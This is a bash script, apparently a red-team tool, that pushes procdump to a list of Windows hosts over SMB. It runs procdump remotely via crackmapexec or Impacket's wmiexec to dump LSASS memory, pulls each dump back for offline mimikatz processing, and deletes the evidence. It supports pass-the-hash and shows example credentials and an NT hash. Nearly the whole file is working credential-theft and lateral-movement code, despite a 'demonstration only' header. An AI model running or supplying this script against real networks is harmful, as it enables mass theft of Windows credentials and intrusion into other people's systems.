#!/usr/bin/env bash

###################################################################
#                                                                 #
# Script to push procdump to host, dump LSASS, and                #
# retrieve dump in order to process with mimikatz locally.        #
#                                                                 #
# Don't use this script. It'll probably DoS everything.           #
#                                                                 #
# Requirements: smbclient, Impacket's wmiexec.py, procdump64.exe  #
# crackmapexec, procdump.exe                                      #
# Notes:                                                          #
#        - Hardcode location of smbclient, procdump, & wmiexec.py #
#        - Create a target list of valid hosts, separated by      #
#          newline. (Can create with "nmap -p 445" and parsing    #
#          out the host ip addresses)                             #
#        - PoC only set up for 64 bit. You're welcome to change   #
#          the wmic flags if you're hitting a 32bit system.       #
#        - PoC assumes share is C$. Change if you like.		  #
#	 - Supports PTH           				  #
#                                                                 #
# Written by Tinker. For Demonstration Purposes Only.             #
#                                                                 #
# Modified by Paragonsec					  #
#								  #
###################################################################

# Script assumes both smbclient and Impacket's wmiexec.py is in your PATH or in the current working directory.
# Change the below variables if you need to direct to a tool's full path.
SMBCLIENT=smbclient
WMIEXEC=wmiexec.py
CRACK=crackmapexec
#WMIEXEC=/full/path/to/impacket/examples/wmiexec.py


USAGE="
Bash script to upload procdump to remote host, dump memory on the remote host, and then download that dump back to the local host.
Flags:
  -u    Username (requires Local Administrator privileges)
  -p    Password
  -H    Hash of user to pass
  -d    Domain (use a dot "." for host based authentication)
  -P    procdump executable path
  -m    method to execute procdump to get LSASS
  -f    File containing IP Addresses or Hostnames of targets. Separated by newline.
  -h    Help text and usage example.

usage:   grabDump.sh -d <domain> -u <username> -p <password> -H <hash> -f <file of target hosts> -P <procdump.exe> -M crackmapexec
example: grabDump.sh -d GIBSON -u zerocool -p hunter2 -f hostlist.txt -P /root/procdump.exe -M crackmapexec
example: grabDump.sh -d . -u Administrator -p Welcome -f hostlist.txt -P /root/procdump.exe -M wmiexec
example: grabDump.sh -d . -u Administrator -H F62A5ADEF2F76CA4712AC820F34BA148 -f hostlist.txt -P /root/procdump64.exe -M crackmapexec
"

# Check if any flags were set. If not, print out help.
if [ $# -eq 0 ]; then
        echo "$USAGE"
        exit
fi

# Set flags.
while getopts "u:p:d:f:h:P:m:H:" FLAG
do
    case $FLAG in
		u)  USERNAME=${OPTARG};;
        p)  PASSWORD=${OPTARG};;
        d)  DOMAIN=${OPTARG};;
        f)
    		if [ ! -f ${OPTARG} ]; then
            	echo "File not found: ${OPTARG}"
                exit 1
            else
                HOSTFILE=${OPTARG}
            fi
            ;;
        h)  echo "${USAGE}"
            exit
            ;;
        P)  PROCDUMP=${OPTARG};;
    	m)  METHOD=${OPTARG};;
        H)  HASH=${OPTARG};;
        *)
            echo "${USAGE}"
            exit
            ;;
    esac
done

# Make sure each required flag was actually set.
if [ -z ${USERNAME+x} ]; then
        echo "Username flag (-u) is not set."
        echo "$USAGE"
        exit
elif [ -z ${PASSWORD+x} ] && [ -z ${HASH+x} ]; then
        echo "Password flag (-p) or hash flag (-H) is not set."
        echo "$USAGE"
        exit
elif [ -z ${DOMAIN+x} ]; then
        echo "User domain flag (-d) is not set."
        echo "$USAGE"
        exit
elif [ -z ${HOSTFILE+x} ]; then
        echo "Hostfile flag (-f) is not set."
        echo "$USAGE"
        exit
elif [ -z ${PROCDUMP+x} ]; then
        echo "Procdump executable (-P) is not set."
        echo "$USAGE"
        exit
elif [ -z ${METHOD+x} ]; then
        echo "A method (-m) to execute command is not set."
        echo "$USAGE"
        exit
fi

# Push it. Dump it. Get it. Remove it.
for TARGETIP in `cat $HOSTFILE`
do
    echo "===| Connecting to $TARGETIP and uploading $PROCDUMP! |==="
	if [ -z ${PASSWORD+x} ]; then
    	$SMBCLIENT \\\\"$TARGETIP"\\C$ -U $USERNAME --pw-nt-hash $HASH -c "put $PROCDUMP procdump.exe"
    else
		$SMBCLIENT \\\\"$TARGETIP"\\C$ -U "$USERNAME" -W "$DOMAIN" "$PASSWORD" -c "put $PROCDUMP procdump.exe"
	fi
	echo
    echo "===| Dumping memory on $TARGETIP! |==="
        if [ "$METHOD" == "crackmapexec" ] || [ "$DOMAIN" == "."  ]; then
            if [ -z ${PASSWORD+x} ]; then
                    $CRACK $TARGETIP -u $USERNAME -H $HASH --local-auth -x 'cmd.exe /c procdump.exe -accepteula -ma lsass.exe lsass.dmp'
            else
                    $CRACK $TARGETIP -u $USERNAME -p $PASSWORD --local-auth -x 'cmd.exe /c procdump.exe -accepteula -ma lsass.exe lsass.dmp'
            fi
        elif [ "$METHOD" == "crackmapexec" ] || ["$DOMAIN" != "." ]; then
            if [ -z ${PASSWORD+x} ]; then
                    $CRACK $TARGETIP -u $USERNAME -H $HASH -d $DOMAIN -x 'cmd.exe /c procdump.exe -accepteula -ma lsass.exe lsass.dmp'
            else
                    $CRACK $TARGETIP -u $USERNAME -p $PASSWORD -d $DOMAIN -x 'cmd.exe /c procdump.exe -accepteula -ma lsass.exe lsass.dmp'
            fi
        elif [ "$METHOD" == "wmiexec" ]; then
            python $WMIEXEC "$DOMAIN"/"$USERNAME":"$PASSWORD"@"$TARGETIP" 'procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp'
        fi
    echo
    echo "===| Retrieving the dump... Muh dumps, muh dumps. Muh lovely LSASS dumps! |==="
	if [ -z ${PASSWORD+x} ]; then
    	$SMBCLIENT \\\\"$TARGETIP"\\C$ -U $USERNAME --pw-nt-hash $HASH -c "get lsass.dmp lsass-$TARGETIP.dmp"
	else
		$SMBCLIENT \\\\"$TARGETIP"\\C$ -U "$USERNAME" -W "$DOMAIN" "$PASSWORD" -c "get lsass.dmp lsass-$TARGETIP.dmp"
	fi
    echo
    echo "===| Check it out! |==="
    echo "> DUMP SAVED IN CURRENT FOLDER AS: lsass-$TARGETIP.dmp"
    echo
    echo "===| And... Cleaning up! |==="
	if [ -z ${PASSWORD+x} ]; then
    	$SMBCLIENT \\\\"$TARGETIP"\\C$ -U $USERNAME --pw-nt-hash $HASH -c "rm procdump.exe;rm lsass.dmp"
	else
		$SMBCLIENT \\\\"$TARGETIP"\\C$ -U "$USERNAME" -W "$DOMAIN" "$PASSWORD" -c "rm procdump.exe;rm lsass.dmp"
	fi
    echo
    echo
done
